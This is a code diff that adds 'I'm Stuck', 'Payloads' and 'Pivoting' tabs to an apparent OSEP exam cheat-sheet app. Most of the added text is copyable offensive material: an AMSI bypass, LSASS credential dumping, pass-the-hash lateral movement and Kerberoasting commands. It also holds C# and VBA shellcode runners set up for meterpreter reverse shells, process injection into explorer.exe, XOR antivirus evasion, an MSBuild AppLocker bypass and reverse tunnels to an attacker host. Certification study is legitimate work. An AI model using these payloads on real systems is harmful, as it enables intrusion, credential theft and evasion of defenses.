@@ -307,6 +307,13 @@ const CSS=`
 .decision-btn{display:block;width:100%;padding:10px 14px;margin-bottom:6px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;color:var(--t0);font-family:var(--s);font-size:12px;font-weight:600;cursor:pointer;text-align:left;transition:all .15s}
 .decision-btn:hover{border-color:var(--ac);background:var(--acd)}
 .decision-btn.active{border-color:var(--ac);background:var(--acd);color:var(--ac)}
+.stuck-card{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:12px 14px;margin-bottom:8px}
+.stuck-q{font-size:13px;font-weight:700;color:var(--t0);margin-bottom:4px}
+.stuck-tip{font-size:11px;color:var(--t2);margin-bottom:6px}
+.tpl-card{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:10px;overflow:hidden}
+.tpl-h{padding:10px 14px;cursor:pointer;display:flex;align-items:center;justify-content:space-between;transition:background .1s;font-size:12px;font-weight:700;color:var(--t0)}
+.tpl-h:hover{background:var(--b3)}
+.tpl-body{border-top:1px solid var(--bd);padding:10px 14px}
 `;
 
 // ━━━ COMPONENTS ━━━
@@ -445,8 +452,106 @@ function NotesTab(){
   </div>)
 }
 
+// ━━━ TAB: I'M STUCK ━━━
+function StuckTab(){
+  const checks=[
+    { q: "Is your payload being detected by AV/EDR?", cmd: "# Try different evasion:\n# 1. XOR/AES encrypt shellcode\n# 2. Use process injection instead of on-disk\n# 3. Try LOLBins (MSBuild, InstallUtil)\n# 4. Compile to .NET assembly, not .exe\n\n# Quick test - does basic calc work?\nmsfvenom -p windows/exec CMD=calc.exe -f csharp", tip: "If your payload works locally but not on target, AV is catching it. Try encrypting shellcode or using a LOLBin.", critical: true },
+    { q: "Did you bypass AMSI?", cmd: "# Reflection bypass:\n$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n$f=$a.GetField('amsiInitFailed','NonPublic,Static')\n$f.SetValue($null,$true)\n\n# Test: 'Invoke-Mimikatz' should NOT be flagged", tip: "AMSI MUST be bypassed before running any PowerShell offensive tool. Try it first in every PowerShell session.", critical: true },
+    { q: "Is Constrained Language Mode (CLM) enabled?", cmd: "# Check:\n$ExecutionContext.SessionState.LanguageMode\n\n# If ConstrainedLanguage:\n# Use C# runspace to get FullLanguage\n# Or use MSBuild inline task\n# Or use InstallUtil with C# payload", tip: "CLM blocks most offensive PowerShell. Use C# to create a PowerShell runspace in FullLanguage mode.", critical: true },
+    { q: "Did you try ALL lateral movement methods?", cmd: "# PsExec:\nimpacket-psexec 'domain/admin:pass'@TARGET\n# WMIExec:\nimpacket-wmiexec 'domain/admin:pass'@TARGET\n# Evil-WinRM:\nevil-winrm -i TARGET -u admin -p pass\n# DCOM:\nimpacket-dcomexec -object ShellWindows 'domain/admin:pass'@TARGET\n# PtH:\nimpacket-psexec -hashes :HASH 'domain/admin'@TARGET", tip: "If one method fails, try another. Some are blocked by firewall rules or AV but others might work.", critical: true },
+    { q: "Did you dump credentials (Mimikatz/LSASS)?", cmd: "# Mimikatz:\nmimikatz 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'\n\n# LSASS dump (AV-friendly):\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump PID lsass.dmp full\n\n# Parse offline:\npypykatz lsa minidump lsass.dmp", tip: "Try comsvcs.dll dump if Mimikatz is detected. Parse the dump offline with pypykatz.", critical: true },
+    { q: "Did you enumerate linked SQL servers?", cmd: "# Find MSSQL:\nnetexec mssql SUBNET -u user -p pass\n\n# Linked servers:\nSELECT * FROM sys.servers;\n\n# Execute on linked server:\nEXEC ('xp_cmdshell ''whoami''') AT [LINKED_SRV]", tip: "Linked SQL servers are a common OSEP lateral movement path. They often have xp_cmdshell enabled." },
+    { q: "Did you check for Kerberos attack paths?", cmd: "# Kerberoast:\nimpacket-GetUserSPNs 'domain/user:pass' -dc-ip DC -request\nhashcat -m 13100 hashes.txt rockyou.txt\n\n# AS-REP Roast:\nimpacket-GetNPUsers 'domain/' -usersfile users.txt -dc-ip DC -request\n\n# Constrained/Unconstrained Delegation:\nimpacket-findDelegation 'domain/user:pass' -dc-ip DC", tip: "Kerberoasting is almost always possible. Even if passwords are strong, check delegation abuse paths." },
+    { q: "Did you check BloodHound for ACL abuse paths?", cmd: "# Collect:\nbloodhound-python -u user -p pass -d domain.local -ns DC_IP -c all\n\n# Key queries:\n# Shortest Path to DA\n# Find Computers with Unconstrained Delegation\n# Find principals with DCSync rights\n# GenericAll / WriteDACL / ForceChangePassword", tip: "BloodHound often reveals paths that manual enumeration misses. Check for ACL abuse chains.", critical: true },
+    { q: "Can you pivot to another network segment?", cmd: "# Chisel:\n# Server: chisel server --reverse -p 8000\n# Client: chisel client LHOST:8000 R:socks\n\n# Ligolo-ng:\n# Proxy: ./proxy -selfcert -laddr 0.0.0.0:11601\n# Agent: ./agent -connect LHOST:11601 -ignore-cert\n\n# Then: proxychains nmap -sT INTERNAL_NET", tip: "OSEP always has multiple network segments. You MUST pivot to find more targets." },
+  ];
+  return(<div>
+    <div className="score-bar"><div className="score-seg" style={{background:'rgba(239,68,68,.08)',color:'var(--r)',flex:2}}>{`⚠️ OSEP Strategy: Bypass defenses first, then enumerate, then move laterally. Repeat for each segment.`}</div></div>
+    <p style={{fontSize:11,color:'var(--t2)',marginBottom:14}}>Go through each question. If you answer "no" to ANY, do it before trying anything else.</p>
+    {checks.map((c,i)=><div className="stuck-card" key={i}>
+      <div style={{display:'flex',alignItems:'flex-start',gap:10,marginBottom:6}}>
+        <div className={`phase-num`} style={{width:24,height:24,fontSize:10,flexShrink:0,background:c.critical?'var(--acd)':'var(--b0)',borderColor:c.critical?'var(--ac)':'var(--bd)',color:c.critical?'var(--ac)':'var(--t2)'}}>{i+1}</div>
+        <div style={{flex:1}}>
+          <div className="stuck-q">{c.q}</div>
+          <div className="stuck-tip">{c.tip}</div>
+        </div>
+        <CopyBtn text={c.cmd}/>
+      </div>
+      <div className="cmd" style={{background:'var(--b0)',padding:8,borderRadius:4,fontSize:10,marginLeft:34}}>{c.cmd}</div>
+    </div>)}
+  </div>)
+}
+
+// ━━━ TAB: PAYLOAD TEMPLATES ━━━
+function PayloadsTab({vals}){
+  const v=vals;
+  const[openT,setOpenT]=useState({});
+  const templates=[
+    { title: "💣 C# Shellcode Runner (VirtualAlloc)", desc: "Basic in-memory shellcode execution.", code: `// Compile: csc /unsafe /out:runner.exe runner.cs\nusing System;\nusing System.Runtime.InteropServices;\n\nclass Program {\n  [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr p, uint s, uint a, uint pr);\n  [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, IntPtr t);\n  [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint m);\n\n  static void Main() {\n    // msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${v.lhost||"LHOST"} LPORT=${v.lport||"443"} -f csharp\n    byte[] buf = new byte[] { /* SHELLCODE HERE */ };\n    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);\n    Marshal.Copy(buf, 0, addr, buf.Length);\n    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n    WaitForSingleObject(hThread, 0xFFFFFFFF);\n  }\n}` },
+    { title: "💉 C# Process Injection (CreateRemoteThread)", desc: "Inject into explorer.exe or another legit process.", code: `using System;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\nusing System.Text;\n\nclass Injector {\n  [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, int pid);\n  [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);\n  [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out UIntPtr w);\n  [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, IntPtr t);\n\n  static void Main() {\n    // msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${v.lhost||"LHOST"} LPORT=${v.lport||"443"} -f csharp\n    byte[] buf = new byte[] { /* SHELLCODE */ };\n    Process target = Process.GetProcessesByName("explorer")[0];\n    IntPtr hProc = OpenProcess(0x001F0FFF, false, target.Id);\n    IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);\n    WriteProcessMemory(hProc, addr, buf, (uint)buf.Length, out _);\n    CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n  }\n}` },
+    { title: "📦 C# with XOR Decryption", desc: "XOR-encrypt shellcode to bypass AV signatures.", code: `// STEP 1: Encrypt shellcode (run on attacker):\n// python3 -c "\n// key = 0xfa\n// with open('sc.bin','rb') as f: buf = f.read()\n// enc = bytes([b ^ key for b in buf])\n// print('byte[] buf = new byte[] {' + ','.join([f'0x{b:02x}' for b in enc]) + '};')\n// "\n\n// STEP 2: C# runner with XOR decryption at runtime:\nusing System;\nusing System.Runtime.InteropServices;\n\nclass Runner {\n  [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr p, uint s, uint a, uint pr);\n  [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, IntPtr t);\n  [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint m);\n\n  static void Main() {\n    byte key = 0xfa;\n    byte[] buf = new byte[] { /* XOR-ENCRYPTED SHELLCODE */ };\n    for (int i = 0; i < buf.Length; i++) buf[i] = (byte)(buf[i] ^ key);\n    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);\n    Marshal.Copy(buf, 0, addr, buf.Length);\n    IntPtr t = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n    WaitForSingleObject(t, 0xFFFFFFFF);\n  }\n}` },
+    { title: "📄 VBA Macro Shellcode Runner", desc: "For Word/Excel phishing documents.", code: `' AutoOpen() runs when document is opened\nPrivate Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddr As LongPtr, ByVal dwSize As Long, ByVal flAllocType As Long, ByVal flProtect As Long) As LongPtr\nPrivate Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttrs As Long, ByVal dwStackSize As Long, ByVal lpStartAddr As LongPtr, ByVal lpParam As LongPtr, ByVal dwCreateFlags As Long, ByRef lpThreadId As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr\n\nSub AutoOpen()\n  Dim buf As Variant\n  ' msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${v.lhost||"LHOST"} LPORT=${v.lport||"443"} -f vbapplication\n  buf = Array(232, 130, ...)  ' SHELLCODE HERE\n  Dim addr As LongPtr\n  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n  Dim i As Long\n  For i = LBound(buf) To UBound(buf)\n    Dim b As Byte: b = buf(i)\n    RtlMoveMemory addr + i, b, 1\n  Next\n  CreateThread 0, 0, addr, 0, 0, 0\nEnd Sub` },
+    { title: "🔨 MSBuild Inline Task (AppLocker Bypass)", desc: "Execute C# via MSBuild — bypasses AppLocker.", code: `<!-- payload.xml -->\n<!-- Execute: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml -->\n<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n  <Target Name="Run"><ClassExample /></Target>\n  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"\n    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">\n    <Task>\n      <Code Type="Class" Language="cs"><![CDATA[\n        using System; using System.Runtime.InteropServices;\n        using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n        public class ClassExample : Task, ITask {\n          [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr p,uint s,uint a,uint pr);\n          [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr sa,IntPtr p,uint f,IntPtr t);\n          [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h,uint m);\n          public override bool Execute() {\n            byte[] buf = new byte[] { /* SHELLCODE */ };\n            IntPtr addr = VirtualAlloc(IntPtr.Zero,(uint)buf.Length,0x3000,0x40);\n            System.Runtime.InteropServices.Marshal.Copy(buf,0,addr,buf.Length);\n            IntPtr t = CreateThread(IntPtr.Zero,0,addr,IntPtr.Zero,0,IntPtr.Zero);\n            WaitForSingleObject(t,0xFFFFFFFF);\n            return true;\n          }\n        }\n      ]]></Code>\n    </Task>\n  </UsingTask>\n</Project>` },
+  ];
+  return(<div>
+    <div className="sec-title">Payload Templates (click to expand)</div>
+    <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>Copy and customize these templates. Replace shellcode with your msfvenom output.</p>
+    {templates.map((t,i)=>(<div className="tpl-card" key={i}>
+      <div className="tpl-h" onClick={()=>setOpenT(p=>({...p,[i]:!p[i]}))}>
+        <div><div style={{marginBottom:2}}>{t.title}</div><div style={{fontSize:10,fontWeight:400,color:'var(--t2)'}}>{t.desc}</div></div>
+        <div style={{display:'flex',gap:6,alignItems:'center'}}>
+          <CopyBtn text={t.code}/>
+          <span className={`arrow ${openT[i]?'open':''}`}>▶</span>
+        </div>
+      </div>
+      {openT[i]&&<div className="tpl-body"><div className="cmd" style={{fontSize:10}}>{t.code}</div></div>}
+    </div>))}
+  </div>)
+}
+
+// ━━━ TAB: PIVOTING ━━━
+function PivotingTab({vals}){
+  const v=vals;
+  const[openS,setOpenS]=useState({});
+  const sections=[
+    { title: "SSH Tunneling", items: [
+      { label: "Dynamic SOCKS proxy", cmd: `ssh -D 1080 ${v.user||"user"}@${v.target||"TARGET"}\n# Configure proxychains: socks5 127.0.0.1 1080\nproxychains nmap -sT -p80,443,445 INTERNAL_NET` },
+      { label: "Local port forward", cmd: `ssh -L 8080:INTERNAL_HOST:80 ${v.user||"user"}@${v.target||"TARGET"}\n# Now access: http://127.0.0.1:8080` },
+      { label: "Remote port forward", cmd: `ssh -R 8080:127.0.0.1:80 ${v.user||"user"}@${v.target||"TARGET"}\n# Target's :8080 now reaches your :80` },
+      { label: "Multi-hop SSH", cmd: `ssh -J ${v.user||"user"}@PIVOT ${v.user||"user"}@INTERNAL_TARGET` },
+    ]},
+    { title: "Chisel", items: [
+      { label: "Reverse SOCKS proxy", cmd: `# On attacker:\nchisel server --reverse -p 8000\n\n# On target:\n./chisel client ${v.lhost||"LHOST"}:8000 R:socks\n\n# Configure proxychains: socks5 127.0.0.1 1080\nproxychains nmap -sT INTERNAL_NET` },
+      { label: "Port forward", cmd: `# On attacker:\nchisel server --reverse -p 8000\n\n# On target:\n./chisel client ${v.lhost||"LHOST"}:8000 R:8080:127.0.0.1:8080` },
+    ]},
+    { title: "Ligolo-ng", items: [
+      { label: "Full VPN-like tunnel", cmd: `# On attacker:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# On target:\n./agent -connect ${v.lhost||"LHOST"}:11601 -ignore-cert\n\n# In ligolo:\nsession\nstart\n\n# Add route:\nsudo ip route add INTERNAL_SUBNET/24 dev ligolo` },
+    ]},
+    { title: "sshuttle", items: [
+      { label: "VPN over SSH", cmd: `sshuttle -r ${v.user||"user"}@${v.target||"TARGET"} 10.10.10.0/24` },
+    ]},
+    { title: "Proxychains Usage", items: [
+      { label: "Scan through proxy", cmd: `# Edit /etc/proxychains4.conf:\n# socks5 127.0.0.1 1080\n\nproxychains nmap -sT -p- INTERNAL_HOST\nproxychains impacket-psexec 'domain/admin:pass'@INTERNAL_HOST\nproxychains evil-winrm -i INTERNAL_HOST -u admin -p pass` },
+    ]},
+  ];
+  return(<div>
+    <div className="sec-title">Pivoting & Tunneling Reference</div>
+    <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>OSEP requires pivoting between network segments. Set up tunnels to reach internal targets.</p>
+    {sections.map((sec,si)=>(<div key={si}>
+      <div className="sec-title">{sec.title}</div>
+      {sec.items.map((item,ii)=>{const k=`${si}-${ii}`;return(<div key={ii}>
+        <div className="qref-card" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
+          <span style={{fontSize:11,fontWeight:600,color:'var(--t0)'}}>{item.label}</span>
+          <CopyBtn text={item.cmd}/>
+        </div>
+        {openS[k]&&<div className="s-exp" style={{margin:'0 0 8px 0'}}><div className="cmd">{item.cmd}</div></div>}
+      </div>)})}
+    </div>))}
+  </div>)
+}
+
 // ━━━ MAIN APP ━━━
-const TABS=["🎯 Decision Engine","⚡ Quick Ref","✅ Checklist","⏱ Timer","📝 Notes"];
+const TABS=["🎯 Decision Engine","⚡ Quick Ref","🆘 I'm Stuck","💀 Payloads","🔀 Pivoting","✅ Checklist","⏱ Timer","📝 Notes"];
 
 function App(){
   const[tab,setTab]=useState(0);
@@ -480,9 +585,12 @@ function App(){
       <div className="main">
         {tab===0&&<DecisionTab vals={vals}/>}
         {tab===1&&<QuickRefTab/>}
-        {tab===2&&<ChecklistTab/>}
-        {tab===3&&<TimerTab/>}
-        {tab===4&&<NotesTab/>}
+        {tab===2&&<StuckTab/>}
+        {tab===3&&<PayloadsTab vals={vals}/>}
+        {tab===4&&<PivotingTab vals={vals}/>}
+        {tab===5&&<ChecklistTab/>}
+        {tab===6&&<TimerTab/>}
+        {tab===7&&<NotesTab/>}
       </div>
     </div>
   </>)
